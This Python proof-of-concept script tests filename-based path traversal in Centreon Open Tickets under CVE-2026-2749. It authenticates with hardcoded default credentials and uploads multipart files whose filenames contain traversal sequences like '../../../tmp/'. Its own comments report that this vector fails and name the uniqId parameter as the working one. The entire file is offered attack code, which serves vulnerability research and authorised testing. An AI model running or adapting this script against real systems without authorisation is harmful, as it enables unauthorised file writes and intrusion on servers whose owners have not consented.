#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Centreon Open Tickets Filename Traversal Test
# CVE            : CVE-2026-2749
# Vendor         : Centreon
# Product        : Centreon Open Tickets
# Affected       : < 25.10.3 / < 24.10.8 / < 24.04.7
# Type           : CWE-22 - Path Traversal
# CVSS           : 9.9 (Critical)
# Platform       : PHP / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-2749 Vector 3: Filename-based Path Traversal Test

Tests whether path traversal is possible through the uploaded file's
filename field (Content-Disposition in multipart upload), as opposed to
the uniqId parameter tested in the primary PoC.

RESULT: NOT EXPLOITABLE — PHP's multipart parser strips directory
components from uploaded filenames before they reach application code.

ATTACK CHAIN:
  1. Authenticate to Centreon
  2. Upload file with traversal sequences in the filename field
  3. Check if file was written outside the opentickets directory
  4. (Expected: file stays in /tmp/opentickets/ with basename only)

PREREQUISITES:
  - Target running Centreon Open Tickets < 25.10.3 / < 24.10.8 / < 24.04.7
  - Valid Centreon user credentials (any privilege level)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-2749
  - https://thewatch.centreon.com/latest-security-bulletins-64/cve-2026-2749-centreon-open-tickets-critical-severity-5493
"""

import sys
import uuid
import http.client
import urllib.parse
import json


# ──────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────

DEFAULT_HOST = "172.22.0.3"
DEFAULT_PORT = 80

USERNAME = "admin"
PASSWORD = "Centreon!2021"

LOGIN_PATH = "/centreon/login.php"
CALL_PATH = "/centreon/modules/centreon-open-tickets/views/rules/ajax/call.php"


def build_multipart_body(field_name, filename, content, content_type="application/octet-stream"):
    """Build multipart form body with exact filename control."""
    boundary = f"----EIPBoundary{uuid.uuid4().hex}"
    body = b""
    body += f"--{boundary}\r\n".encode()
    # NOTE: The filename here includes traversal sequences — this is the key test
    body += f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode()
    body += f"Content-Type: {content_type}\r\n\r\n".encode()
    body += content
    body += b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return f"multipart/form-data; boundary={boundary}", body


class FilenameTraversalExploit:
    """Test filename-based path traversal in CVE-2026-2749."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.session_cookie = None

    def _request(self, method, path, body=None, headers=None):
        conn = http.client.HTTPConnection(self.host, self.port, timeout=10)
        hdrs = headers or {}
        if self.session_cookie:
            hdrs["Cookie"] = self.session_cookie
        try:
            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            data = resp.read()
            try:
                return resp.status, dict(resp.getheaders()), json.loads(data)
            except (json.JSONDecodeError, ValueError):
                return resp.status, dict(resp.getheaders()), data.decode("utf-8", errors="replace")
        except Exception as e:
            print(f"  [!] Connection error: {e}")
            return None, None, None
        finally:
            conn.close()

    def authenticate(self):
        print("[*] Authenticating...")
        body = urllib.parse.urlencode({"useralias": USERNAME, "password": PASSWORD})
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        status, resp_headers, _ = self._request("POST", LOGIN_PATH, body, headers)
        if status is None:
            return False
        set_cookie = resp_headers.get("Set-Cookie", "")
        if "PHPSESSID" in set_cookie:
            self.session_cookie = set_cookie.split(";")[0]
            print(f"  [+] Authenticated: {self.session_cookie}")
            return True
        print("  [!] Authentication failed")
        return False

    def test_filename_traversal(self):
        """Test path traversal via the filename field in multipart upload."""
        print("[*] Testing filename-based path traversal...")

        # Normal uniqId, traversal in filename
        # Path: /tmp/opentickets/testid__../../../tmp/filename_traversal_proof.txt
        # If this works, the file ends up at /tmp/filename_traversal_proof.txt
        # If not, rename() fails because "testid__..." directory component doesn't exist

        uniq_id = "abcdef1234567"
        traversal_filename = "../../../tmp/filename_traversal_proof.txt"
        proof_content = b"CVE-2026-2749 FILENAME TRAVERSAL PROOF"

        upload_url = (
            f"{CALL_PATH}?action=upload-file"
            f"&uniqId={urllib.parse.quote(uniq_id, safe='')}"
        )

        print(f"  [*] uniqId: {uniq_id}")
        print(f"  [*] filename: {traversal_filename}")
        print(f"  [*] Expected path: /tmp/opentickets/{uniq_id}__{traversal_filename}")
        print(f"  [*] Resolved path: /tmp/filename_traversal_proof.txt (if traversal works)")

        content_type, body = build_multipart_body(
            "file", traversal_filename, proof_content
        )

        status, _, data = self._request(
            "POST", upload_url, body, {"Content-Type": content_type}
        )

        print(f"  [*] Response: HTTP {status} — {data}")

        if isinstance(data, dict) and data.get("code") == 0:
            print("  [+] Server returned success — filename traversal may have worked")
            print("  [*] Verify with: docker exec cve-2026-2749-vulnerable cat /tmp/filename_traversal_proof.txt")
            return "success_response"
        else:
            print("  [-] Server indicated failure — filename traversal likely blocked by filesystem")
            return "failure_response"

    def test_filename_traversal_relative(self):
        """Alternative: traversal that stays closer to opentickets dir."""
        print()
        print("[*] Testing alternative filename traversal (relative, shallower)...")

        # Try: /tmp/opentickets/testid__../fntest_proof.txt
        # This would resolve to /tmp/opentickets/fntest_proof.txt
        # But the "testid__..." component might block this too

        uniq_id = "abcdef1234567"
        traversal_filename = "../fntest_proof.txt"
        proof_content = b"CVE-2026-2749 FILENAME TRAVERSAL RELATIVE PROOF"

        upload_url = (
            f"{CALL_PATH}?action=upload-file"
            f"&uniqId={urllib.parse.quote(uniq_id, safe='')}"
        )

        print(f"  [*] uniqId: {uniq_id}")
        print(f"  [*] filename: {traversal_filename}")

        content_type, body = build_multipart_body(
            "file", traversal_filename, proof_content
        )

        status, _, data = self._request(
            "POST", upload_url, body, {"Content-Type": content_type}
        )

        print(f"  [*] Response: HTTP {status} — {data}")

        if isinstance(data, dict) and data.get("code") == 0:
            print("  [+] Server returned success — checking location")
            return "success_response"
        else:
            print("  [-] Server indicated failure")
            return "failure_response"

    def run(self):
        print("=" * 65)
        print("  CVE-2026-2749 Vector 3: Filename-based Traversal Test")
        print(f"  Target: {self.host}:{self.port}")
        print("=" * 65)
        print()

        if not self.authenticate():
            print("\n[!] FAILED: Authentication unsuccessful")
            return False

        print()

        result1 = self.test_filename_traversal()
        result2 = self.test_filename_traversal_relative()

        print()
        print("=" * 65)
        print("  RESULTS SUMMARY")
        print("=" * 65)
        print(f"  Deep traversal (filename=../../../tmp/...): {result1}")
        print(f"  Shallow traversal (filename=../...): {result2}")
        print()
        if "success" in result1 or "success" in result2:
            print("  [+] Filename-based traversal appears to work!")
            print("      Both uniqId AND filename are exploitable parameters.")
        else:
            print("  [-] Filename-based traversal does NOT work as expected.")
            print("      The '__' separator creates an invalid directory component")
            print("      (e.g., 'testid__..') that doesn't exist, causing rename() to fail.")
            print("      PRIMARY VECTOR: Use uniqId parameter for traversal instead.")

        return True


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    exploit = FilenameTraversalExploit(host, port)
    exploit.run()
